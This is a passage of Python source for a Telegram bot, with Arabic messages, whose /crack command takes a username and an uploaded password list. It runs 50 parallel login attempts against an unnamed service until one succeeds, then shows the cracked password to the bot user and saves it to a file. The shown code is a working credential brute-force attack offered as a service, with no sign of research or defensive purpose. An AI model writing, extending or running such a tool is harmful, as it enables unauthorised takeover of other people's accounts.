        parse_mode=ParseMode.MARKDOWN
    )

@dp.message(Command("crack"))
async def cmd_crack(message: types.Message):
    global found_password, token, attack_running
    
    user_id = message.from_user.id
    user_file = f"user_{user_id}.txt"
    pass_file = f"passwords_{user_id}.txt"
    
    if not os.path.exists(user_file) or not os.path.exists(pass_file):
        await message.answer("❌ ما عندك ملفات! أرسل ملف الباسوردات أولاً مع اليوزر في الكابشن")
        return
    
    if attack_running:
        await message.answer("⏳ في عملية شغالة! انتظر...")
        return
    
    # قراءة البيانات
    with open(user_file, "r") as f:
        username = f.read().strip()
    
    with open(pass_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    if not passwords:
        await message.answer("❌ الملف فاضي!")
        return
    
    found_password = None
    attack_running = True
    
    msg = await message.answer(
        f"🔐 بدء التخمين...\n\n"
        f"👤 يوزر: `{username}`\n"
        f"🔑 باسوردات: {len(passwords)}\n"
        f"⏳ جاري جلب التوكن...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # جلب التوكن
    token = get_token()
    
    await msg.edit_text(
        f"🔐 جاري التخمين...\n\n"
        f"👤 يوزر: `{username}`\n"
        f"🔑 باسوردات: {len(passwords)}\n"
        f"🧵 خيوط: 50\n"
        f"⏳ الحالة: جاري...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    start_time = time.time()
    
    # تشغيل التخمين في thread منفصل
    def run_attack():
        global found_password
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(try_login, pwd, username): pwd for pwd in passwords}
            
            for future in as_completed(futures):
                if found_password:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
    
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, run_attack)
    
    elapsed = time.time() - start_time
    attack_running = False
    
    if found_password:
        await msg.edit_text(
            f"✅ **تم العثور على الباسورد!**\n\n"
            f"👤 يوزر: `{username}`\n"
            f"🔓 باسورد: `{found_password}`\n"
            f"⏱️ الوقت: {elapsed:.1f} ثانية",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # حفظ في الملف
        with open("found_password.txt", "w") as f:
            f.write(f"User: {username}\nPass: {found_password}")
            
    else:
        await msg.edit_text(
            f"❌ **ما لقينا الباسورد**\n\n"
            f"👤 يوزر: `{username}`\n"
            f"🔑 جربنا: {len(passwords)} باسورد\n"
            f"⏱️ الوقت: {elapsed:.1f} ثانية",
            parse_mode=ParseMode.MARKDOWN
        )

